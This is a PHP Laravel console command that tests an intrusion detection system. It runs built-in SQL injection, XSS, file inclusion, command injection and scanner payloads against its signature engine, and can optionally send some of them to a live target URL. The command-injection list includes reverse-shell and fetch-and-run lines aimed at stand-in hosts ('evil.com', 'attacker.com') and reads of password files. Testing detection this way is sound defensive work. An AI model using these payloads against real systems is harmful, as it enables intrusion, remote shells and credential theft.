<?php

namespace App\Console\Commands;

use App\Models\IdsAlert;
use App\Models\IdsSignature;
use App\Services\Detection\SignatureEngine;
use App\Services\Detection\AnomalyEngine;
use App\Services\Detection\BehaviorEngine;
use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;

/**
 * IDS/IPS Security Test Suite
 * 
 * Automated testing for detection and defense capabilities
 */
class SecurityTest extends Command
{
    protected $signature = 'ids:security-test 
                            {--type=all : Test type (all, sqli, xss, lfi, rce, scanner)}
                            {--target= : Target URL to test against}
                            {--detailed : Show detailed output}';

    protected $description = 'Run automated security tests on IDS/IPS detection';

    private array $testResults = [];
    private int $passed = 0;
    private int $failed = 0;

    /**
     * Attack payloads for each category
     */
    private array $attackPayloads = [
        'sqli' => [
            "1' OR '1'='1",
            "1'; DROP TABLE users--",
            "' UNION SELECT * FROM users--",
            "1' AND 1=1--",
            "admin'--",
            "1; SELECT * FROM information_schema.tables",
            "' OR 1=1#",
            "1' WAITFOR DELAY '0:0:5'--",
        ],
        'xss' => [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert(1)</script>",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
        ],
        'lfi' => [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd%00",
            "..%2f..%2f..%2fetc/passwd",
            "....\\....\\....\\windows\\system32\\config\\sam",
            "php://filter/convert.base64-encode/resource=index.php",
        ],
        'rce' => [
            "; cat /etc/passwd",
            "| ls -la",
            "`id`",
            "$(whoami)",
            "; wget http://evil.com/shell.sh",
            "| nc -e /bin/sh attacker.com 4444",
            "; curl http://evil.com/malware.sh | bash",
        ],
        'scanner' => [
            "nikto",
            "sqlmap",
            "nmap",
            "acunetix",
            "nessus",
            "burpsuite",
        ],
    ];

    public function handle(): int
    {
        $this->info('');
        $this->info('╔═══════════════════════════════════════════════════════════╗');
        $this->info('║      Security One IDS/IPS - Automated Test Suite          ║');
        $this->info('╚═══════════════════════════════════════════════════════════╝');
        $this->info('');

        $testType = $this->option('type');
        $targetUrl = $this->option('target');

        // Check signatures are loaded
        $signatureCount = IdsSignature::where('enabled', true)->count();
        $this->info("📋 Loaded Signatures: {$signatureCount}");
        
        if ($signatureCount === 0) {
            $this->warn('⚠️  No signatures loaded! Run: php artisan ids:seed-signatures');
            return 1;
        }

        $this->newLine();

        // Run tests based on type
        if ($testType === 'all') {
            foreach (array_keys($this->attackPayloads) as $type) {
                $this->runCategoryTests($type);
            }
        } else {
            if (!isset($this->attackPayloads[$testType])) {
                $this->error("Unknown test type: {$testType}");
                $this->line('Available types: all, sqli, xss, lfi, rce, scanner');
                return 1;
            }
            $this->runCategoryTests($testType);
        }

        // If target URL provided, run live tests
        if ($targetUrl) {
            $this->newLine();
            $this->runLiveTests($targetUrl);
        }

        // Show summary
        $this->showSummary();

        return $this->failed > 0 ? 1 : 0;
    }

    /**
     * Run tests for a specific attack category
     */
    private function runCategoryTests(string $category): void
    {
        $categoryName = strtoupper($category);
        $this->info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        $this->info("🔍 Testing: {$categoryName}");
        $this->info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

        $payloads = $this->attackPayloads[$category];
        $engine = app(SignatureEngine::class);

        foreach ($payloads as $payload) {
            $this->testPayload($category, $payload, $engine);
        }

        $this->newLine();
    }

    /**
     * Test a single payload against signature engine
     */
    private function testPayload(string $category, string $payload, SignatureEngine $engine): void
    {
        // Create mock log data with the attack payload
        $logData = [
            'ip' => '192.168.1.100',
            'method' => 'GET',
            'uri' => [
                'full' => "/test?q=" . urlencode($payload),
                'path' => '/test',
                'query' => 'q=' . urlencode($payload),
            ],
            'status' => 200,
            'user_agent' => $category === 'scanner' ? $payload : 'Mozilla/5.0',
            'timestamp' => now()->toDateTimeString(),
        ];

        // Check against signature engine
        $result = $engine->analyze($logData);
        $detected = !empty($result);

        if ($detected) {
            $this->passed++;
            $matchedSig = $result[0]['signature'] ?? 'Unknown';
            $displayPayload = strlen($payload) > 40 ? substr($payload, 0, 40) . '...' : $payload;
            
            if ($this->option('detailed')) {
                $this->line("  <fg=green>✓</> Detected: <fg=yellow>{$displayPayload}</>");
                $this->line("    └─ Matched: {$matchedSig}");
            } else {
                $this->line("  <fg=green>✓</> Detected: <fg=yellow>" . substr($payload, 0, 50) . "</>");
            }
            
            $this->testResults[$category][] = [
                'payload' => $payload,
                'detected' => true,
                'signature' => $matchedSig,
            ];
        } else {
            $this->failed++;
            $this->line("  <fg=red>✗</> Missed: <fg=gray>{$payload}</>");
            
            $this->testResults[$category][] = [
                'payload' => $payload,
                'detected' => false,
                'signature' => null,
            ];
        }
    }

    /**
     * Run live tests against a target URL
     */
    private function runLiveTests(string $targetUrl): void
    {
        $this->info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
        $this->info("🌐 Live Testing: {$targetUrl}");
        $this->info("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");

        $livePayloads = [
            ['type' => 'SQLI', 'path' => "?id=1' OR '1'='1"],
            ['type' => 'XSS', 'path' => "?search=<script>alert(1)</script>"],
            ['type' => 'LFI', 'path' => "?file=../../../etc/passwd"],
            ['type' => 'RCE', 'path' => "?cmd=;cat+/etc/passwd"],
        ];

        foreach ($livePayloads as $test) {
            $url = rtrim($targetUrl, '/') . '/' . $test['path'];
            
            try {
                $startTime = microtime(true);
                $response = Http::timeout(5)->get($url);
                $responseTime = round((microtime(true) - $startTime) * 1000);
                
                $status = $response->status();
                $blocked = $status === 403 || $status === 406;
                
                if ($blocked) {
                    $this->line("  <fg=green>✓</> {$test['type']}: Blocked (HTTP {$status}) - {$responseTime}ms");
                } else {
                    $this->line("  <fg=yellow>○</> {$test['type']}: Allowed (HTTP {$status}) - {$responseTime}ms");
                }
            } catch (\Exception $e) {
                $this->line("  <fg=red>✗</> {$test['type']}: Error - {$e->getMessage()}");
            }
        }
    }

    /**
     * Show test summary
     */
    private function showSummary(): void
    {
        $total = $this->passed + $this->failed;
        $passRate = $total > 0 ? round(($this->passed / $total) * 100, 1) : 0;

        $this->newLine();
        $this->info('═══════════════════════════════════════════════════════════');
        $this->info('                     TEST SUMMARY');
        $this->info('═══════════════════════════════════════════════════════════');
        $this->newLine();

        // Category breakdown
        $headers = ['Category', 'Detected', 'Missed', 'Rate'];
        $rows = [];
        
        foreach ($this->testResults as $category => $results) {
            $detected = count(array_filter($results, fn($r) => $r['detected']));
            $missed = count($results) - $detected;
            $rate = count($results) > 0 ? round(($detected / count($results)) * 100) : 0;
            $rows[] = [
                strtoupper($category),
                $detected,
                $missed,
                "{$rate}%",
            ];
        }
        
        $this->table($headers, $rows);

        $this->newLine();
        $this->info("Total Tests: {$total}");
        $this->info("<fg=green>Passed: {$this->passed}</>");
        $this->info("<fg=red>Failed: {$this->failed}</>");
        $this->info("Detection Rate: <fg=cyan>{$passRate}%</>");
        $this->newLine();

        if ($passRate >= 80) {
            $this->info('🎉 <fg=green>EXCELLENT!</> IDS is performing well.');
        } elseif ($passRate >= 60) {
            $this->warn('⚠️  ACCEPTABLE. Consider adding more signatures.');
        } else {
            $this->error('❌ POOR. Please review and update signatures.');
        }

        $this->newLine();
    }
}
